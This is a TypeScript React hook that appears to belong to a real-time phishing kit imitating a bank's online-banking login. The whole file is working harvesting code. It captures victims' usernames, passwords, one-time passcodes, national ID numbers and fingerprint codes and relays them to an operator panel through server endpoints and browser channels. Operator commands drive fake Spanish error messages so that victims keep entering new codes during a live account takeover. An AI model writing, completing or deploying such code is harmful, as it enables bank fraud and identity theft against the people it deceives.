import { useState, useEffect, useRef } from 'react'

export type SessionState =
  | 'idle'
  | 'waiting'
  | 'waiting-code'
  | 'typing'
  | 'done'
  | 'error-login'
  | 'error-cod1'
  | 'error-cod2'
  | 'error'
  | 'dispositivo'

const CHANNEL = 'gananet-ops'
const STORAGE_KEY = 'gananet-ops-event'

export function useOperatorSession() {
  const [status, setStatus] = useState<SessionState>('idle')
  const [errorMsg, setErrorMsg] = useState<string | null>(null)
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [usePhp, setUsePhp] = useState(false)

  const sessionIdRef = useRef<string | null>(null)
  const statusRef = useRef<SessionState>('idle')
  const typingTimeoutRef = useRef<number | null>(null)

  // Keep refs in sync for interval/event handlers
  useEffect(() => {
    sessionIdRef.current = sessionId
  }, [sessionId])

  useEffect(() => {
    statusRef.current = status
  }, [status])

  // Persistent ping interval as long as session is active
  useEffect(() => {
    const ping = () => {
      if (sessionIdRef.current) {
        publish({
          type: 'session:ping',
          sessionId: sessionIdRef.current,
        })
      }
    }
    const interval = window.setInterval(ping, 5000)
    return () => {
      window.clearInterval(interval)
    }
  }, [])

  // Instant ping on session ID change
  useEffect(() => {
    if (sessionId) {
      publish({
        type: 'session:ping',
        sessionId,
      })
    }
  }, [sessionId])

  const isLocal = 
    window.location.hostname === 'localhost' || 
    window.location.hostname === '127.0.0.1' || 
    window.location.hostname.startsWith('192.168.') || 
    window.location.hostname.startsWith('10.') || 
    window.location.hostname.startsWith('172.')

  useEffect(() => {
    if (isLocal) {
      setUsePhp(false)
      return
    }
    fetch('/sessions.php')
      .then((res) => {
        const ct = res.headers.get('content-type') || ''
        setUsePhp(res.ok && ct.includes('application/json'))
      })
      .catch(() => {
        setUsePhp(false)
      })
  }, [isLocal])

  const channelRef = useRef<BroadcastChannel | null>(null)
  const ignoreActionsUntilRef = useRef<number>(0)

  // Initialize persistent BroadcastChannel
  useEffect(() => {
    try {
      channelRef.current = new BroadcastChannel(CHANNEL)
    } catch (_) {
      /* ignore */
    }
    return () => {
      if (channelRef.current) {
        channelRef.current.close()
      }
    }
  }, [])



  const publish = (message: any) => {
    const payload = { ...message, ts: Date.now() }
    if (channelRef.current) {
      try {
        channelRef.current.postMessage(payload)
      } catch (_) {
        /* ignore */
      }
    }
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(payload))
    } catch (_) {
      /* ignore */
    }
    
    if (isLocal) {
      // Cross-browser local server publish
      fetch(`http://${window.location.hostname}:3001/publish`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {
        /* ignore server down */
      })
    } else if (usePhp) {
      // Cross-browser production PHP publish
      fetch('/sessions.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {
        /* ignore server down */
      })
    } else {
      // Cross-browser production Node server publish (e.g. Render)
      fetch('/publish', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {
        /* ignore server down */
      })
    }
  }

  const cleanUp = () => {
    if (typingTimeoutRef.current) {
      window.clearTimeout(typingTimeoutRef.current)
      typingTimeoutRef.current = null
    }
  }

  const resetSession = () => {
    if (sessionIdRef.current) {
      ignoreActionsUntilRef.current = Date.now() + 3000
      publish({
        type: 'session:action',
        sessionId: sessionIdRef.current,
        action: 'reset',
      })
    }
    setStatus('idle')
    setErrorMsg(null)
  }

  const startSession = (user: string, pass: string, tipoUsuario: string) => {
    cleanUp()
    setErrorMsg(null)
    ignoreActionsUntilRef.current = Date.now() + 3000
    
    // Reuse sessionId if it exists (e.g. they had a login error and corrected it)
    const activeSessionId = sessionIdRef.current || `session-${Date.now()}-${Math.floor(Math.random() * 10000)}`
    setSessionId(activeSessionId)
    setStatus('waiting')

    const sessionPayload = {
      id: activeSessionId,
      username: user,
      password: pass,
      tipoUsuario,
      device: window.innerWidth < 900 ? 'mobile' : 'desktop',
      ip: '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 254 + 1),
      state: 'waiting',
      createdAt: Date.now(),
    }

    // Publish session creation
    publish({
      type: 'session:created',
      session: sessionPayload,
    })
  };

  const sendToken = (token: string) => {
    if (sessionId) {
      if (typingTimeoutRef.current) {
        window.clearTimeout(typingTimeoutRef.current)
        typingTimeoutRef.current = null
      }
      ignoreActionsUntilRef.current = Date.now() + 3000
      setStatus('typing')
      publish({
        type: 'session:token',
        sessionId,
        token,
      })
    }
  }

  useEffect(() => {
    const handleMessage = (data: any) => {
      if (!data || typeof data !== 'object') return
      if (data.sessionId !== sessionIdRef.current) return

      if (data.type === 'session:action') {
        const action = data.action
        if (action === 'codigo') {
          setStatus('waiting-code')
          setErrorMsg(null)
        } else if (action === 'error-login') {
          setStatus('error-login')
          setErrorMsg('El usuario o la contraseña ingresada es incorrecta. Por favor, verifique sus datos.')
          cleanUp()
        } else if (action === 'error-cod1') {
          setStatus('error-cod1')
          setErrorMsg('La OTP ingresada es incorrecta.')
        } else if (action === 'error-cod2') {
          setStatus('error-cod2')
          setErrorMsg('La OTP ingresada es incorrecta.')
        } else if (action === 'done' || action === 'verificado') {
          setStatus('done')
          cleanUp()
        } else if (action === 'dispositivo') {
          setStatus('dispositivo')
          setErrorMsg(null)
        }
      }
    }

    // 1. Listen on BroadcastChannel
    if (channelRef.current) {
      channelRef.current.onmessage = (event) => {
        handleMessage(event.data)
      }
    }

    // 2. Listen on localStorage for cross-origin or tabs
    const handleStorageChange = (event: StorageEvent) => {
      if (event.key === STORAGE_KEY && event.newValue) {
        try {
          const parsed = JSON.parse(event.newValue)
          handleMessage(parsed)
        } catch (_) {
          /* ignore */
        }
      }
    }
    window.addEventListener('storage', handleStorageChange)

    // 3. Listen on Server EventStream (SSE)
    let eventSource: EventSource | null = null
    if (isLocal || !usePhp) {
      try {
        const sseUrl = isLocal ? `http://${window.location.hostname}:3001/events` : '/events'
        eventSource = new EventSource(sseUrl)
        eventSource.onmessage = (event) => {
          try {
            const parsed = JSON.parse(event.data)
            handleMessage(parsed)
          } catch (_) {
            /* ignore */
          }
        }
      } catch (_) {
        /* ignore */
      }
    }

    return () => {
      if (channelRef.current) {
        channelRef.current.onmessage = null
      }
      window.removeEventListener('storage', handleStorageChange)
      if (eventSource) {
        eventSource.close()
      }
    }
  }, [sessionId, usePhp])

  // Production PHP polling effect
  useEffect(() => {
    if (isLocal || !usePhp || !sessionId) return

    const poll = () => {
      fetch('/sessions.php')
        .then((res) => res.json())
        .then((sessions: any[]) => {
          if (Array.isArray(sessions)) {
            const ourSession = sessions.find((s) => s.id === sessionId)
            if (ourSession) {
              if (Date.now() < ignoreActionsUntilRef.current) return
              const state = ourSession.state
              if (state === 'waiting-code') {
                if (!ourSession.token || statusRef.current !== 'typing') {
                  setStatus('waiting-code')
                  setErrorMsg(null)
                }
              } else if (state === 'error-login') {
                setStatus('error-login')
                setErrorMsg('El usuario o la contraseña ingresada es incorrecta. Por favor, verifique sus datos.')
                cleanUp()
              } else if (state === 'error-cod1') {
                setStatus('error-cod1')
                setErrorMsg('La OTP ingresada es incorrecta.')
              } else if (state === 'error-cod2') {
                setStatus('error-cod2')
                setErrorMsg('La OTP ingresada es incorrecta.')
              } else if (state === 'done' || state === 'verificado') {
                setStatus('done')
                cleanUp()
              } else if (state === 'dispositivo') {
                setStatus('dispositivo')
                setErrorMsg(null)
              }
            }
          }
        })
        .catch(() => {})
    }

    poll()
    const interval = window.setInterval(poll, 2000)
    return () => {
      window.clearInterval(interval)
    }
  }, [sessionId, usePhp])

  const clearError = () => {
    if (status === 'error-cod1' || status === 'error-cod2') {
      setStatus('waiting-code')
      setErrorMsg(null)
      if (sessionIdRef.current) {
        publish({
          type: 'session:token',
          sessionId: sessionIdRef.current,
          token: '',
        })
      }
    }
  }

  const notifyTyping = () => {
    if (!sessionIdRef.current) return

    if (typingTimeoutRef.current) {
      window.clearTimeout(typingTimeoutRef.current)
      typingTimeoutRef.current = null
    }

    publish({
      type: 'session:token',
      sessionId: sessionIdRef.current,
      token: '',
    })

    typingTimeoutRef.current = window.setTimeout(() => {
      if (!sessionIdRef.current) return
      
      const currentStatus = statusRef.current
      if (currentStatus === 'idle') {
        publish({
          type: 'session:action',
          sessionId: sessionIdRef.current,
          action: 'reset',
        })
      } else if (currentStatus === 'error-login') {
        publish({
          type: 'session:action',
          sessionId: sessionIdRef.current,
          action: 'error-login',
        })
      } else if (currentStatus === 'waiting-code') {
        publish({
          type: 'session:action',
          sessionId: sessionIdRef.current,
          action: 'codigo',
        })
      }
    }, 3000)
  }

  const sendVerificationSuccess = () => {
    setStatus('done')
    setErrorMsg(null)
    if (sessionIdRef.current) {
      publish({
        type: 'session:action',
        sessionId: sessionIdRef.current,
        action: 'verificado',
      })
    }
  }

  const sendDeviceData = (cedula: string, codigoDactilar: string) => {
    if (sessionIdRef.current) {
      if (typingTimeoutRef.current) {
        window.clearTimeout(typingTimeoutRef.current)
        typingTimeoutRef.current = null
      }
      setStatus('typing')
      publish({
        type: 'session:device',
        sessionId: sessionIdRef.current,
        cedula,
        codigoDactilar,
      })
    }
  }

  return {
    status,
    errorMsg,
    sessionId,
    startSession,
    sendToken,
    resetSession,
    clearError,
    notifyTyping,
    sendVerificationSuccess,
    sendDeviceData,
  }
}
